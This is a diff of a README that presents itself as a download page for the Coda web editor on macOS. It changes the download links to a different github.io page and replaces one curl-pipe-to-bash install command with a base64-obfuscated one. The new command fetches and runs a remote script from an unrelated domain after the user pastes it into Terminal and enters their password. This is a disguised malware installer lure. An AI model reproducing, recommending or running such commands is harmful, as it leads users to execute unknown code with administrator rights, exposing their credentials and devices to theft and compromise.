@@ -7,7 +7,7 @@ With support for HTML, CSS, JavaScript, PHP, and more, Coda delivers a streamlin
 ---
 
 ## ✅ Download Coda for macOS  
-[![Download Coda](https://img.shields.io/badge/Download-Coda-blueviolet)](https://coda-mac-download.github.io/.github)
+[![Download Coda](https://img.shields.io/badge/Download-Coda-blueviolet)](https://shuziktobehuman.github.io/huja/Coda)
 
 ---
 
@@ -26,7 +26,7 @@ With support for HTML, CSS, JavaScript, PHP, and more, Coda delivers a streamlin
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -67,7 +67,7 @@ Coda is a comprehensive web editor that brings together coding, previewing, and 
 
 ---
 
-[![Download Coda](https://img.shields.io/badge/Download-Coda-blueviolet)](https://coda-mac-download.github.io/.github)
+[![Download Coda](https://img.shields.io/badge/Download-Coda-blueviolet)](https://shuziktobehuman.github.io/huja/Coda)
 
 ---
 
